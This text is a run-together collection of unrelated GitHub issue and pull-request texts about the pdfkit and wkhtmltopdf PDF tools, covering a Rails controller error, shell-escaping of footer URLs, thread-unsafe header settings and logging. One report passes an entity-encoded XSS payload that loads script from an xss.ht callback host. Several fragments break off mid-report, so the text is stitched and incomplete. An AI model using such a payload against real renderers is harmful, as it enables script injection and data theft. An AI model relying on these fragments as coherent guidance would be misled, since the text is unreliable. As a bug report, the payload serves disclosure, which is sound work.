I'm getting this error using Rails 6. Not sure if it's an issue with my code or if the Gem needs to be updated? 

my DownloadsController: 

```
class DownloadsController < ApplicationController
 
  def show
    respond_to do |format|
      format.pdf { send_audit_pdf }
    end
  end

  private

  def audit_pdf
    audit = Audit.last
    Download.new(audit) 
  end


  def send_audit_pdf
    send_file download.to_pdf, download_attributes
  end

  def send_audit_pdf
    send_file audit_pdf.to_pdf,
      filename: audit_pdf.filename,
      type: "application/pdf",
      disposition: "inline"
  end
end
```

My Download model: 

```
require "render_anywhere"
 
class Download 
  include RenderAnywhere

  def initialize(audit) 
    @audit = audit
  end
 
  def to_pdf 
    kit = PDFKit.new(as_html, page_size: 'A4')
    kit.to_file("#{Rails.root}/public/audit.pdf")
  end
 
  def filename
    "audit #{audit.id}.pdf"
  end
 
  private
 
    attr_reader :audit
 
    def as_html
      byebug 
      render template: "audits/pdf", layout: "audit_pdf", locals: { audit: audit }
    end
end

```

I have a template in `audit/pdf.html.erb`:

```
<h1>Request</h1>

<div class="flex-grid">
    <div class="items-col">

        <h3>State</h3>
        <h3>Time Modified</h3>
        <h3>License</h3>
        <h3>Account</h3>
        <h3>DPPA Reason</h3>

    </div>
   <div class="items-col">

        <h3><%= @audit[:request_state] %></h3>
        <h3><%= @audit[:time_modified] %></h3>
        <h3><%= @audit[:request_license] %></h3>
        <h3><%= @audit[:account] %></h3>
        <h3><%= @audit[:customers_reason] %></h3>

    </div>
</div>
```

and layouts/audit_pdf.html.erb:

```
<!DOCTYPE html>
<html>
<head>
  <title>Audit PDF</title>
  <style>
    <%= Rails.application.assets.find_asset('audit.pdf').to_s %>
  </style>
</head>
<body>
  <%= yield %>
</body>
</html>
```

I've byebugged myself all the way down and don't appear to be missing any params/variables upto `to_html` method. 
When passing `footer_html` options from application to `wkhtmltopdf` via pdfkit
```html
<html>
    <meta name='pdfkit-footer_html' content='http://localhost/footer?a=1&b=2'
</html>
```

Pdfkit compose the following command to send to `wkhtmltopdf`
`/bin/wkhtmltopdf --footer-html http://localhost/footer\?a\=1\&b\=2 - -`

This causes a malformed command to `wkhmtltopdf`
command output: `You need to specify at least one input file, and exactly one output file
Use - for stdin or stdout`

*Note: the command is valid when there is no `&` in command string*
e.g. `/bin/wkhtmltopdf --footer-html http://localhost/footer\?a\=1 - -`

I also read about similar issues being reported, such as https://github.com/pdfkit/pdfkit/issues/311, https://github.com/pdfkit/pdfkit/pull/312, https://github.com/pdfkit/pdfkit/pull/207, however, those were issues with source url instead of pdfkit options
The RubyGems property rubyforge_project is removed without a replacement.

I am generating PDF using the method mentioned in wiki - https://github.com/pdfkit/pdfkit/wiki/Adding-header-and-footers

I feel since the PDFKit config is modified this is **not thread safe**. I am running `sidekiq` with concurrency `2` and I already getting mixed output. The PDF are generated with the right body content but the `header` and `footer` came from another PDF. 

Is there a way to mention `header_html` in an instance variable instead of the constant `PDFKit`.

```  
def config
    PDFKit.configure do |config|
      config.wkhtmltopdf = "/usr/local/bin/wkhtmltopdf"

      config.default_options = {
        encoding:"UTF-8",
        dpi: '300',
        margin_top: '30',
        margin_bottom: '23',
        margin_left: '10',
        margin_right: '10',
        header_spacing: '0',
        header_html: render_header_footer("header"),
        footer_spacing: '2',
        footer_html: render_header_footer("footer"),
        quiet: true,
        :"user-style-sheet" => "#{Rails.root}/app/assets/stylesheets/pdfkit.scss"
      }
    end
  end
```

I have different `header` and `footer` for every PDF document generated.
This PR adds the ability to log the output of wkhtmltopdf and the commands used to a separate logfile.

Using i.e. 

```
PDFKit.configure do |config|
  config.log_file = Rails.root.join("log/pdfkit-#{Rails.env}.log")
end
```

makes the output is no longer read from stderr and injected into the standard webserver logs.
Update to wkhtmltopdf-binary-edge as wkhtmltopdf-binary gem is deprecated
pefkit - 0.6.1
wkhtmltopdf - 0.12.4
platform - linux

```
import pdfkit
pdfkit.from_string('&#x3C;script src=&#x22;https://sehacure.xss.ht&#x22;&#x3E;&#x3C;/script&#x3E;', '<file_path>')
```

Actual Output:
![image](https://user-images.githubusercontent.com/6340565/47951601-da8cb180-df88-11e8-8874-bf0dbf90b623.png)





Expected Output:
`&#x3C;script src=&#x22;https://sehacure.xss.ht&#x22;&#x3E;&#x3C;/script&#x3E;',` in pdf

I am not sure whether this issue is solely with wkhtmltopdf or in calling wkhtmltopdf by pdfkit.

The [spec states](http://www.rubydoc.info/github/rack/rack/file/SPEC#The_Body): 

> If the body is replaced by a middleware after action, the original body must be closed first, if it responds to close.

However, we can see that this does not happen:

The version of wkhtmltopdf is as follows.

```sh
$ wkhtmltopdf -V

I installed wkhtmltopdf as described [here](https://gist.github.com/brunogaspar/bd89079245923c04be6b0f92af431c10#file-readme-md).

Any idea how to fix this?
